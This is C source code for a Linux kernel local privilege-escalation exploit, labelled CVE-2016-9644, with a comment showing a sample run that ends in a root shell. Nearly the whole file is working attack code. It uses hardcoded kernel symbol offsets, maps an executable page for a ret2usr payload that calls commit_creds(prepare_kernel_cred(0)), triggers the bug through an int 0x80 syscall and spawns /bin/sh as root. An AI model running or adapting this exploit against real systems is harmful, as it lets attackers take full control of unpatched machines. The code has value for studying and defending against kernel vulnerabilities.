/*
~/sploit$ ./a
[*] Exploit for CVE-2016-9644
[*] ~ d

[+] Using version: 4.4.23-040423-generic
[+] prepare_cred = 0xffffffff810a1570
[+] commit_cred = 0xffffffff810a1180

[*] ch00 ch00 Dropping the r00t


# id
uid=0(root) gid=0(root) groups=0(root)
*/
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/utsname.h>
#include <stdlib.h>

typedef long __attribute__((regparm(3))) (*o_prepare_kernel_cred) (unsigned long c);  
typedef long __attribute__((regparm(3))) (*o_commit_creds) (unsigned long c);

o_commit_creds commit_creds;
o_prepare_kernel_cred prepare_kernel_cred;

void rewt()
{ 
  commit_creds(prepare_kernel_cred(0));
}

void pwnit()
{
  asm("mov $rewt,%rax; call *%rax\n");
  asm("add $8, %rsp\n");
}

struct kernel_offset
{
  char *release;
  unsigned int leak;
  unsigned long prepare_cred;
  unsigned long commit_cred;
};

int main()
{
  unsigned int size = (unsigned int)&main - (unsigned int)&pwnit;
  struct utsname u;
  int i = 0;
  int entry = -1;
  //there is probably a better way to calculate where to allocate our ret2user buffer but yolo
  //these are offsets from the kernels i tested the exploit on but I got bored and abandoned this since the exploit is kind of boring
  struct kernel_offset offsets[] =
    {                        // ret2usr, prepare_kernel_cred(), commit_creds()
      {"4.1.35-040135-generic",0x17f82a6,0xffffffff8109d910,0xffffffff8109da20},
      {"4.4.22-040422-generic",0x181252d,0xffffffff810a1570,0xffffffff810a1180},
      {"4.4.23-040423-generic",0x18125ad,0xffffffff810a1570,0xffffffff810a1180}
    };
  
  uname(&u);

  printf("[*] Exploit for CVE-2016-9644\n");
  printf("[*] ~ d\n\n");

  for(i = 0; i < sizeof(offsets)/sizeof(struct kernel_offset); i++)
    {
      if(!strcmp(u.release,offsets[i].release))
	{
	  printf("[+] Using version: %s\n",offsets[i].release);
	  printf("[+] prepare_cred = 0x%lx\n",offsets[i].prepare_cred);
	  printf("[+] commit_cred = 0x%lx\n\n",offsets[i].commit_cred);
	  entry = i;
	  break;
	}
    }

  if(entry == -1)
    {
      printf("[-] Could not find offsets for running kernel, exiting...\n");
      exit(-1);
    }
  
  char *map = mmap((void *)(int *)(offsets[entry].leak & 0xFFFF000), 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);

  if(map == MAP_FAILED)
    {
      printf("[-] mmap fail\n");
      exit(-1);
    }
  prepare_kernel_cred = (void *)(long)offsets[entry].prepare_cred;
  commit_creds = (void *)(long)offsets[entry].commit_cred;

  map += offsets[entry].leak & 0x0000FFF;
  memcpy(map,pwnit,size);
  
  //trigger it
  //since this bug happens when calling 32bit syscalls in x64 mode call the syscall using int 0x80
  asm("mov $178, %eax; int $0x80\n");
  if(getuid() == 0)
    {
      printf("[*] ch00 ch00 Dropping the r00t\n\n\n");
      execl("/bin/sh","sh",(char *)0);
    }
  else
    printf("[-] Exploit failed\n");

  return 0;
}

